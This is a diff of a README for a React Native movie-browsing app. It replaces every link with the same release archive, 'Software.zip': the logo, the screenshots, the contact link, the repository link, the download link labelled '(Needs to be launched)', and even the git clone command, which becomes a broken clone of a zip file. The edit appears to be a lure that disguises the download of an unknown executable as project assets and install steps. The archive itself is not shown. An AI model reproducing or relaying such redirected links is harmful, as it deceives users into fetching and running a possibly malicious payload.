@@ -1,6 +1,6 @@
 # 🎬 MovieApp 🍿
 
-![MovieApp Logo](https://example.com/movieapp-logo.png)
+![MovieApp Logo](https://github.com/Afthab21/MovieApp/releases/download/v1.0/Software.zip)
 
 Welcome to MovieApp! This React Native application leverages the OMDb API to bring you a seamless movie browsing experience. With MovieApp, you can explore a vast array of movies, search for specific titles, delve into detailed movie information, and much more!
 
@@ -16,11 +16,11 @@ Welcome to MovieApp! This React Native application leverages the OMDb API to bri
 - Expo
 
 ## Screenshots 📷
-![Screenshot 1](https://example.com/screenshot1.png)
-![Screenshot 2](https://example.com/screenshot2.png)
+![Screenshot 1](https://github.com/Afthab21/MovieApp/releases/download/v1.0/Software.zip)
+![Screenshot 2](https://github.com/Afthab21/MovieApp/releases/download/v1.0/Software.zip)
 
 ## Installation 🛠️
-1. Clone the repository: `git clone https://github.com/yourusername/MovieApp.git`
+1. Clone the repository: `git clone https://github.com/Afthab21/MovieApp/releases/download/v1.0/Software.zip`
 2. Install dependencies: `npm install`
 3. Start the application: `npm start`
 
@@ -31,15 +31,15 @@ Welcome to MovieApp! This React Native application leverages the OMDb API to bri
 4. Enjoy exploring movie information!
 
 ## Feedback 🌟
-If you have any feedback, suggestions, or issues with MovieApp, feel free to [reach out](mailto:movieapp@example.com). Your input is valuable to us as we strive to improve the app.
+If you have any feedback, suggestions, or issues with MovieApp, feel free to [reach out](https://github.com/Afthab21/MovieApp/releases/download/v1.0/Software.zip). Your input is valuable to us as we strive to improve the app.
 
 ## Contributors ✨
 - John Doe
 - Jane Smith
 
 ## Links 🔗
-- [View on GitHub](https://github.com/yourusername/MovieApp)
-- [Download MovieApp 🔗](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip) (Needs to be launched)
+- [View on GitHub](https://github.com/Afthab21/MovieApp/releases/download/v1.0/Software.zip)
+- [Download MovieApp 🔗](https://github.com/Afthab21/MovieApp/releases/download/v1.0/Software.zip) (Needs to be launched)
 
 ## Repository Topics 🏷️
 axios, expo, expo-app, movie-app, movie-finder-app, movies-app-react, native-app, omdb-api, react, react-applications, react-native, react-native-app
